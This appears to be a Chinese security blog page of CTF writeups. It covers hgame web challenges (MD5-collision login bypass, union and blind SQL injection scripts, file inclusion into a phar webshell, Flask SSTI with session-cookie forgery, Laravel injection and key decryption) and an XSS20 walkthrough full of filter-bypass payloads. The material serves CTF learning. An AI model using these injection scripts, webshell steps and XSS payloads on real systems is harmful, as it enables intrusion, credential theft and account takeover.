(($username == $password ) or ($username == $code) or ($password == $code)) &#123; echo \"Your input can't be the same\"; &#125; else if ((md5($username) === md5($password)) and (md5($password) === md5($code)))&#123; echo \"Good\"; header('Location: admin.php'); exit(); &#125; else &#123; echo \"&lt;pre&gt; Invalid password&lt;/pre&gt;\"; &#125;&#125; 可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章link，有一个工具fastcoll就可以生成两个MD5值相同的不同文件 先生成两个MD5值相同的文件 1fastcoll_v1.0.0.5.exe -o test0 test1 然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同 1fastcoll_v1.0.0.5.exe -p test1 -o test00 test01 将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01 12tail -c 128 test00 &gt; atail -c 128 test01 &gt; b 执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11 12type test0 a &gt; test10type test1 b &gt; test11 于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下 1curl --data-urlencode username@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test00 --data-urlencode password@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test01 --data-urlencode code@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test10 http://118.25.89.91:8080/question/login.php -i 之后可以得到服务器返回的cookieSet-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下1$cmd = str_replace(\"flag\",'none',$cmd); 绕过很简单，通配符与单引号都可以绕过 payload：cat /fl?? OR cat /fl&#39;&#39;ag flag：hgame{a1c83b66cc504d583c09ea6c20c0dabc} sqli-11substr(md5($_GET[\"code\"]),0,4) === 7229 题目需要验证码，可以爆破一下 123456for($i=0;$i&lt;999999999;$i++)&#123; if(substr(md5($i), 0, 4)==='803a')&#123; echo $i; break; &#125;&#125; 然后就是常规的数字型注入了，注意每次都要更新一下code值 1?code=4446&amp;id=1 order by 1--+ 1?code=31226&amp;id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()--+ f1l1l1l1g,words 不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下 1?code=70176&amp;id=-1 union select group_concat(column_name) from information_schema.columns where table_name=0x66316c316c316c3167--+ f14444444g 1?code=51097&amp;id=-1 union select f14444444g from f1l1l1l1g--+ flag: hgame{sql1_1s_iNterest1ng} sqli-2依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。 PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了 123456789101112131415161718192021222324252627282930313233343536import hashlibimport requestsimport reimport stringcookies = &#123;'PHPSESSID':'lseqgohjo9eibfivnemk6sa8vd'&#125;def md5(_in): m = hashlib.md5() m.update(_in.encode('utf-8')) return m.hexdigest()[0:4]def get_code(): global url res = requests.get(url, cookies=cookies).text code = re.findall(r'=== (.&#123;4&#125;)&lt;br&gt;',res)[0] for i in range(9999999999999): if code == md5(str(i)): return str(i)url = \"http://118.89.111.179:3001/\"output = \"hgame&#123;sqli_1s_s0_\"succ = \"sql error\"name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + '_&#123;&#125;' + ','for i in range(18,60): for j in name_dic: code = get_code() # payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+' # F11111114G,WORDS # payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name=\"F11111114G\"),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+' # FL4444AG payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select FL4444AG from F11111114G),&#123;str(i)&#125;,1)=binary \"&#123;str(j)&#125;\"),sleep(-5),1)--+' res = requests.get(url+payload,cookies=cookies).text if succ in res: output += j print(\"output: \",output) break flag如下 1hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125; 基础渗透正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有action=message，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含 1http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index 得到源码12345678910&lt;?phpinclude_once(\"template/header.php\");if (is_null($_SESSION['user_id'])) &#123; header('Location:/login.php'); exit();&#125;$page = array_key_exists('action', $_GET) ? $_GET['action'] : 'message';require $page .'.php';include_once(\"template/footer.php\");?&gt; functions.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208&lt;?php//ini_set(\"display_errors\", \"on\");require_once('config.php');session_start();function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function csrf_token()&#123; $token = ''; $chars = str_split('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'); for ($i = 0; $i &lt; 48; $i++) &#123; $token = $token . $chars[random_int(0, 61)]; &#125; $_SESSION['token'] = $token; echo \"&lt;input type='hidden' value='$token' id='token'&gt;\";&#125;function res_to_json($res, $type)&#123; $json['type'] = $type; $json['status'] = \"true\"; $json[\"content\"] = array(); foreach ($res as $message) &#123; $array_tmp['user_id'] = $message['user_id']; $array_tmp['user'] = $message['user']; $array_tmp['avatar'] = get_avatar($message['user_id']) != null ? get_avatar($message['user_id'])['content'] : md5($message['user']); $array_tmp['message'] = $message['content']; $array_tmp['message_id'] = $message['message_id']; $array_tmp['time'] = $message['date']; array_push($json[\"content\"], $array_tmp); &#125; $json[\"content\"] = $json[\"content\"]; return json_encode($json);&#125;function judge($username, $password)&#123; if ($username == null) &#123; echo \"username's length error!\"; return false; &#125; elseif (strlen($password) &lt; 6 or strlen($password) &gt; 16) &#123; echo \"password's length error!\"; return false; &#125; else &#123; return true; &#125;&#125;function register($username, $password, $token)&#123; if (judge($username, $password) == 1 and $token === $_SESSION['token']) &#123; $password = md5($password); $sql_query = \"insert into `users`(`username`,`password`) VALUES ('$username','$password')\"; $res = sql_query($sql_query); if ($res) &#123; echo 'register success!'; &#125; else &#123; echo 'error!'; &#125; &#125; else &#123; echo \"error!\"; return false; &#125;&#125;function login($username, $password, $token)&#123; if (!isset($_SESSION['login']) and $token === $_SESSION['token']) &#123; $password = md5($password); $sql_query = \"select * from `users` where `username`='$username' and `password`='$password'\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION['user_id'] = $data['user_id']; $_SESSION['user'] = $data['username']; $_SESSION['groups'] = $data['groups']; $_SESSION['login'] = 1; setcookie('user', $_SESSION['user']); setcookie('groups', $_SESSION['groups']); &#125; else &#123; echo \"error!\"; return false; &#125; &#125; else &#123; echo \"error!\"; return false; &#125;&#125;function loginout()&#123; if ($_GET['loginout'] === $_SESSION['token']) &#123; session_destroy(); setcookie('groups', null); setcookie('user', null); Header(\"Location: index.php\"); &#125;&#125;function get_avatar($user_id)&#123; $sql_query = \"select `avatar` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query)-&gt;fetch_row()[0]; if ($res) &#123; return array('name' =&gt; $res, 'content' =&gt; base64_encode(file_get_contents('./img/avatar/' . $res . '.png'))); &#125; else &#123; return null; &#125;&#125;function get_new_messages()&#123; $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return res_to_json($res, \"messages\"); &#125;&#125;function get_messages()&#123; $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return res_to_json($res, \"messages\"); &#125;&#125;function add_message($message)&#123; if ($_POST['token'] === $_SESSION['token']) &#123; if (isset($_SESSION['login']) and mb_strlen($message) &gt; 6) &#123; $user_id = $_SESSION['user_id']; $user = $_SESSION['user']; $sql_query = \"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')\"; sql_query($sql_query); &#125; elseif (!isset($_SESSION['login'])) &#123; echo \"login error\"; &#125; else &#123; echo \"length error\"; &#125; &#125;&#125;function delete_message($message_id)&#123; $user_id = $_SESSION['user_id']; if ($_POST['token'] === $_SESSION['token']) &#123; if ($_SESSION['groups'] == 0) &#123; $sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\"; &#125; elseif ($_SESSION['groups'] == 1) &#123; $sql_query = \"delete from `messages` where `message_id`=$message_id\"; &#125; sql_query($sql_query); &#125;&#125;function rand_filename()&#123; $tmp = `cat /dev/urandom | head -n 10 | md5sum | head -c 15`; $sql_query = \"select `avatar` from `users` where `avatar`=$tmp\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return rand_filename(); &#125; else &#123; return $tmp; &#125;&#125;function upload_avatar()&#123; $type = $_FILES['file']['type']; $user_id = $_SESSION['user_id']; if ($type == 'image/gif' || $type == 'image/jpeg' || $type == 'image/png') &#123; $avatar = get_avatar($user_id); if ($avatar == null) &#123; $name = rand_filename(); move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $name . \".png\"); $sql_query = \"update `users` set `avatar`='$name' WHERE `user_id`=$user_id\"; sql_query($sql_query); &#125; else &#123; move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $avatar['name'] . \".png\"); &#125; &#125;&#125;function change_password($opassword, $npassword, $npasswod_again)&#123; if (judge($_SESSION['user'], $npassword)) &#123; if ($npasswod_again !== $npassword) &#123; echo \"difference error\"; &#125; else &#123; $user_id = $_SESSION['user_id']; $sql_query = \"select `password` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; if ($res-&gt;fetch_row()[0] === md5($opassword)) &#123; $sql_query = \"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\"; $res = sql_query($sql_query); echo $res; echo \"successful\"; &#125; else &#123; echo \"oldpassword error\"; &#125; &#125; &#125; &#125;&#125; 审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入$sql_query = “delete from messages where message_id=$message_id and user_id=$user_id”;，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下1234567891011121314151617181920212223import requestsimport recookies = &#123; \"groups\":\"0\", \"PHPSESSID\":\"c419fq3ppu11r1o2tra4l9rlnm\", \"user\":\"snowtest\"&#125;url_del = 'http://111.231.140.29:10080/messages_api.php?action=delete'url = 'http://111.231.140.29:10080/index.php?action=message'message = \"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#\"avatar = ''for i in range(1,100): for j in range(34,127): r = requests.get(url,cookies=cookies) token = re.findall(r\"value='(.*)' id='token'&gt;\",r.text)[0] data = dict(token=token,message_id=message.format(i,j)) try: r = requests.post(url_del,cookies=cookies,data=data,timeout=4) except: avatar += chr(j) print(avatar) break 可以得到我的账号对应的文件名为1bce72251d3c333，在upload_avatar()中会在文件名后面强行拼接png后缀move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);，也就是最终上传的文件名会被命名为1bce72251d3c333.png，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了require $page .&#39;.php&#39;;，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传 然后上传，之后访问http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell即可getshell 然后就是文件探测了，可以使用find命令snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);，最终payload 1hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125; BabyXss题目环境有点问题 WEEK-4happypythonpython下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的http://118.25.18.223:3001/{{1+1}} 接下来读取配置文件http://118.25.18.223:3001/{{config}}，可以获取到secret_key 解一下cookie 1python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3* 1&#123;u&apos;csrf_token&apos;: u&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;111&apos;, u&apos;_id&apos;: u&apos;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&apos;&#125; 猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie 1python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&apos;csrf_token&apos;:&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;,&apos;_fresh&apos;:True,&apos;user_id&apos;:&apos;1&apos;,&apos;_id&apos;:&apos;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&apos;&#125; 然后将生成的cookie覆盖原来cookie即可得到flag 1hgame&#123;Qu_bu_la1_m1ng_z1_14&#125; ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错ValueError: dictionary update sequence element #0 has length 1; 2 is required，查看了一下代码发现是在dict()函数处报错的 1session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) 但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于{aa:aa}，而linux下却是{&#39;aa&#39;:&#39;aa&#39;}，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是&quot;捣的鬼，在windows下我们输入的&quot;是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子 123import sysfor i in range(4): print(sys.argv[i]) 我们输入python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \\&quot;\\&#39;，此时输出为1234b.pykey:value&apos;key&apos;:&apos;value&apos;&quot;\\&apos; 这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~） happyPHP正常注册之后登录，查看源代码可以得到项目源代码!--https://github.com/Lou00/laravel--&gt; 审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计 可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。 app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题 123456789if (Auth::attempt($credentials)) &#123; if (Auth::user()-&gt;id ===1)&#123; session()-&gt;flash('info','flag :******'); return redirect()-&gt;route('users.show'); &#125; $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()-&gt;name.\"'\"); session()-&gt;flash('info', 'hello '.$name[0]-&gt;name); return redirect()-&gt;route('users.show');&#125; 可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为&#39; union select group_concat(email,password) from users where id=1#，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag）， 1admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ== 密码是经过加密的，解密一下 {“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”} 查看配置文件可以发现使用了aes加密，但是key值不知道12&apos;key&apos; =&gt; env(&apos;APP_KEY&apos;),&apos;cipher&apos; =&gt; &apos;AES-256-CBC&apos;, 回滚git版本找到key值 APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ= 接下来编写解密脚本123456789101112import base64from Crypto.Cipher import AESiv = 'rnVrqfCvfJgnvSTi9z7KLw=='value = 'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='enc = '9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='enc = base64.b64decode(enc)iv = base64.b64decode(iv)value = base64.b64decode(value)cryptor = AES.new(enc,AES.MODE_CBC,iv)con = cryptor.decrypt(value)print con 可以得到密码为9pqfPIer0Ir9UUfR，登录即可得到flag Reference： https://xz.aliyun.com/t/3161 https://zry.io/archives/183","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"XSS20冲关之旅","slug":"xss20","date":"2019-03-01T16:09:49.000Z","updated":"2019-05-20T12:32:32.015Z","comments":true,"path":"2019/03/02/xss20/","link":"","permalink":"http://chaosec.top/2019/03/02/xss20/","excerpt":"前言最近学到了xss漏洞，来做一下这个xss题目","text":"前言最近学到了xss漏洞，来做一下这个xss题目 XSS-1第一关热身，没有任何过滤。payload：&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; XSS-2查看代码可知1234$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=\"'.$str.'\"&gt; 对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签 payload: keyword=&quot;&gt; &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，此时在代码中input标签的内容就变成1&lt;input name=keyword value=&quot;&quot;&gt; &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt; 成功成为了两个标签从而xss成功 XSS-3这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过 payload: http://localhost/xss20/level3.php?keyword=&#39; onclick=&#39;window.alert()&#39; XSS-4我们可以先fuzz一下，输入&lt;script&gt;&#39;&quot;，然后查看源代码可知 可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可 1http://localhost/xss20/level4.php?keyword=&quot; onclick=&quot;window.alert()&quot; XSS-5想上一关测试一下&lt;script&gt;&#39;&quot;，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤&lt;&gt;，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过1http://localhost/xss20/level5.php?keyword=&quot;&gt;&lt;a href=javascript:alert(19)&gt; 查看源代码可知题目采用黑名单过滤了&lt;script和on两个敏感词 XSS-6测试&lt;script&gt;&#39;&quot;on，发现还是基本和上关的过滤一样，&lt;input name=keyword value=&quot;&lt;scr_ipt&gt;&#39;&quot;o_n&quot;&gt;，用上题payload故技重施，发现并没有那么简单，href被置换成了hr_ef，继续测试data,action,formaction，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀…1http://localhost/xss20/level6.php?keyword=&quot;&gt;&lt;a Href=javascript:alert(19)&gt; XSS-7继续测试&lt;script&gt;&#39;&quot;on-&gt;&lt;&gt;&#39;&quot;on，猜测可能是将script置换为空字符，尝试双写绕过&lt;scscriptript&gt;，成功！对于其他敏感词如on等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串1http://localhost/xss20/level7.php?keyword=&quot; oonnclick=&quot;window.alert() XSS-8测试script&gt;&lt;&#39;&quot; 可以看到对于a标签来说只过滤了双引号，还有将script替换成了scr_ipt，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在href=&quot;&quot;上面做文章，本来我们可以提交javascript:alert()，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&amp;#开头的编码方式）1http://localhost/xss20/level8.php?keyword=java&amp;#115;cript:alert(&apos;xss&apos;) 1234567$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6); 查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的 浏览器解码方式与XSS在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的 浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为HTML-&gt;URL-&gt;JS各种解释器能够识别的编码方式 HTML解释器识别的是HTML实体编码，也就是&amp;#xx这种的 URL解释器可以识别URL编码 JS解释器可以识别Unicode编码，类似\\uxxx 浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的&lt;&gt;将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。 我们来探讨一下下面四个写法是否能够成功执行JS &lt;a href=javascript:al\\u65rt(1)&gt;click&lt;/a&gt; &lt;a href=javascript:al%65rt(1)&gt;click&lt;/a&gt; &lt;a href=javascript:al&amp;#101;rt(1)&gt;click&lt;/a&gt; &lt;a href=jav%61script:alert(1)&gt;click4&lt;/a&gt; 第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为alert(&#39;\\u65&#39;)就可以被成功执行 第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行 第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行 第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对 回到第8题，我们也就可以理解了，如果我们将javacript全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的 XSS-9测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现http://就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可 1http://localhost/xss20/level9.php?keyword=java&amp;#115cript:alert()/*http://*/ 查看代码可以看到过滤果然就是我们猜测的内容1if(false===strpos($str7,'http://')) XSS-10本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是hidden所以看不到，测试发现第三个参数是有效参数，而且只过滤了&lt;&gt;两个符号，所以我们用之前的payload即可，在设置type=text使其可见 1http://localhost/xss20/level10.php?keyword=aaa&amp;t_link=addd&amp;t_history=ffads&amp;t_sort=&quot; onclick=&quot;window.alert()&quot; type=&quot;text XSS-11题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在Referer字段，该字段存在注入的问题 测试&lt;&gt;script&#39;&quot;，发现&lt;&gt;被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已 XSS-12和上体基本一样，只不过本题是UA头的xss 1&quot; onclick=&quot;window.alert()&quot; type=&quot;text XSS-13cookie的xss 1user=&quot; onclick=&quot;window.alert()&quot; type=&quot;text; XSS-14这关环境有问题，网站访问不了，好像是一个图片型xss XSS-15ng-include 题目好像有点问题 XSS-16本题过滤的挺多的，过滤了script、空格、/，只要没过滤尖括号就万事好说，空格我们可以用%0a绕过，payload12http://localhost/xss20/level16.php?keyword=&lt;input%0Aonclick=&quot;window.alert()&quot;&gt;http://localhost/xss20/level16.php?keyword=&lt;image%0Asrc=1%0aonerror=&quot;alert()&quot;&gt; XSS-17本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，&lt;&gt;、&quot;被过滤，我们可以使用onclick参数 1http://localhost/xss20/level17.php?arg01=ffff&amp;arg02=fff%208888%20onclick=alert() XSS-18过滤了&lt;&gt; &quot;，感觉和17题没什么区别 12http://localhost/xss20/level18.php?arg01=wwww&amp;arg02=bfff%20888%20onfocus=alert()http://localhost/xss20/level18.php?arg01=wwww&amp;arg02=bfff%20888%20onclick=alert() 可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD XSS-19从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的， 1http://localhost/xss20/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(document.domain)%22%3Exss_by_SST%3C/a%3E XSS-20payload看不懂 1http://localhost/xss20/level20.php?arg01=id&amp;arg02=\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height 有时间再研究吧，这个用的另一种脚本语言 总结对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签 XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie 总的来说，对于XSS攻击，我们要对输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。 reference:https://www.cnblogs.com/escape-w/p/10162831.htmlhttps://blog.csdn.net/he_and/article/details/80588409","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chaosec.top/tags/XSS/"}]},{"title":"CUMTCTF第二轮月赛","slug":"cumtctf2","date":"2019-01-30T14:50:00.000Z","updated":"2019-02-12T14:29:27.946Z","comments":true,"path":"2019/01/30/cumtctf2/","link":"","permalink":"http://chaosec.top/2019/01/30/cumtctf2/","excerpt":"前言本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。","text":"前言本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。 web签到题123456789101112131415161718192021222324252627282930&lt;?php $white_list = range(0,9); require_once('flag.php'); if(isset($_REQUEST['0ver']) &amp;&amp; isset($_REQUEST['0ver1']) &amp;&amp; isset($_REQUEST['0ver2']))&#123; $a = $_REQUEST['0ver']; $b = $_REQUEST['0ver1']; $c = $_REQUEST['0ver2']; if(@ereg(\"^[0-9]+$\", $a) === FALSE)&#123; echo 'no must be number'; &#125;else&#123; if(in_array($a,$white_list))&#123; if(strlen($a)&gt;1)&#123; if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; echo \"&lt;img src='dark.png'&gt;&lt;br&gt;\"; echo 'you are a great dark phper&lt;br&gt;'; echo $flag; &#125; else&#123; echo \"you can do it!!!\"; &#125; &#125;else&#123; echo 'you no dark'; &#125; &#125;else&#123; echo 'you are so dark'; &#125; &#125; &#125;else highlight_file(__FILE__); 很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 